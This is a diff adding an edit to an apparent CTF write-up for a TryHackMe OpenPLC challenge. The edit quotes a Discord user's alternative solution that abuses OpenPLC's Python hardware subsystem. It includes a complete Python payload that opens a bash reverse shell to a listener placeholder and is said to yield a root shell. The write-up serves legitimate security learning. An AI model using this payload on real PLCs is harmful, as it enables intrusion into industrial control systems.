@@ -455,6 +455,117 @@ Successfully opened the gate at address 10.
 
 <h2 id="conclusion">Conclusion</h2>
 <p>I found this challenge extremely interesting because I really like to experiment with resolving &ldquo;strange&rdquo; challenges that differ from the usual categories. I&rsquo;ve always been curious aubout OT (Operational Technology), which differs from IT technologies but shares some common security flaws. In future CTFs, I would like to dive deeper into OT technologies and better understand the differences and connections between IT security and OT security, while continuing to learn and apply my skills about this topic.</p>
+<hr>
+<h3 id="edit">EDIT:</h3>
+
+
+
+
+
+
+<div class="notice callout">
+    <div class="icon">
+        
+        
+        <span class="n-emoji">💡</span>
+        
+    </div>
+    <div class="content">
+        After sharing this writeup on the fantastic TryHackMe Discord group, a friendly user named <strong>Korizma</strong> shared another possible solution, which we decided to include here for completeness, by exploiting the &ldquo;Python Linux Hardware Subsystem&rdquo;.
+    </div>
+</div>
+
+<style>
+    .notice {
+        display: flex;
+        padding: 10px;
+        margin-bottom: 20px;
+        border-radius: 4px;
+    }
+
+    .notice .icon {
+        display: flex;
+        align-items: center;
+    }
+
+    .notice .n-emoji {
+        display: flex;
+        align-items: center;
+    }
+
+
+    .notice .content {
+        margin-left: 0.5rem;
+    }
+
+    .success {
+        background-color: #edf3ec;
+        color: #458361;
+        border: 1px solid #edf3ec;
+    }
+
+    .info {
+        background-color: #e7f3f9;
+        color: #347ea9;
+        border: 1px solid #e7f3f9;
+    }
+    .callout {
+        background-color: #f1f1ef;
+        color: #37352f;
+        border: 1px solid #f1f1ef;
+    }
+
+    .warning {
+        background-color: #fbf3dc;
+        color: #cb9230;
+        border: 1px solid #fbf3dc;
+    }
+
+    .error {
+        background-color: #fdebec;
+        color: #d44c47;
+        border: 1px solid #fdebec;
+    }
+</style>
+
+<p><strong>Here is Korizma’s full message:</strong></p>
+<p>You can also get a reverse shell from KABOOM PT.2 using the Python Linux Hardware Subsystem. : the Hardware tab in the web dashboard, which featured a dropdown menu for &ldquo;Python on Linux (PSM)&rdquo;. This powerful subsystem is designed to allow administrators to write custom drivers but effectively creates a feature-based RCE, allowing arbitrary Python code to be executed by the OpenPLC runtime.</p>
+<p>Exploit Development &amp; Execution
+Initial payloads placed in the hardware_init() function failed, likely because the PLC&rsquo;s network stack was not fully initialized.</p>
+<p>The successful exploit was triggered from within the update_inputs() function, which is called on every PLC cycle. This ensured the system was in a stable state before execution. To prevent the main PLC loop from crashing, the final payload launches the reverse shell in a separate, non-blocking thread.</p>
+<p>Final PSM Exploit Payload
+This code was pasted into the PSM editor, saved, and triggered by restarting the PLC.</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Final, Concrete PSM Exploit Payload</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#111">os</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#111">threading</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># A flag to ensure the exploit only runs once.</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">exploit_attempted</span> <span style="color:#f92672">=</span> <span style="color:#00a8c8">False</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">counter</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00a8c8">def</span> <span style="color:#75af00">hardware_init</span><span style="color:#111">():</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Left empty to ensure PLC stability on boot.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00a8c8">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00a8c8">def</span> <span style="color:#75af00">update_inputs</span><span style="color:#111">():</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># This function is called on every PLC cycle.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00a8c8">global</span> <span style="color:#111">counter</span><span style="color:#111">,</span> <span style="color:#111">exploit_attempted</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#111">counter</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Execute exploit after 5 cycles to ensure PLC is stable.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00a8c8">if</span> <span style="color:#111">counter</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> <span style="color:#111">exploit_attempted</span><span style="color:#111">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#111">exploit_attempted</span> <span style="color:#f92672">=</span> <span style="color:#00a8c8">True</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#111">exploit_thread</span> <span style="color:#f92672">=</span> <span style="color:#111">threading</span><span style="color:#f92672">.</span><span style="color:#111">Thread</span><span style="color:#111">(</span><span style="color:#111">target</span><span style="color:#f92672">=</span><span style="color:#111">run_exploit</span><span style="color:#111">,</span> <span style="color:#111">daemon</span><span style="color:#f92672">=</span><span style="color:#00a8c8">True</span><span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#111">exploit_thread</span><span style="color:#f92672">.</span><span style="color:#111">start</span><span style="color:#111">()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00a8c8">def</span> <span style="color:#75af00">run_exploit</span><span style="color:#111">():</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># This function contains the single, most reliable reverse shell payload.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#111">os</span><span style="color:#f92672">.</span><span style="color:#111">system</span><span style="color:#111">(</span><span style="color:#d88200">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/YOUR_LISTENER_IP/4444 0&gt;&amp;1&#39;&#34;</span><span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00a8c8">def</span> <span style="color:#75af00">update_outputs</span><span style="color:#111">():</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00a8c8">pass</span>
+</span></span></code></pre></div><p>Pasting this code and restarting the PLC resulted in a root shell. GGs! 👑</p>
 
 
 		
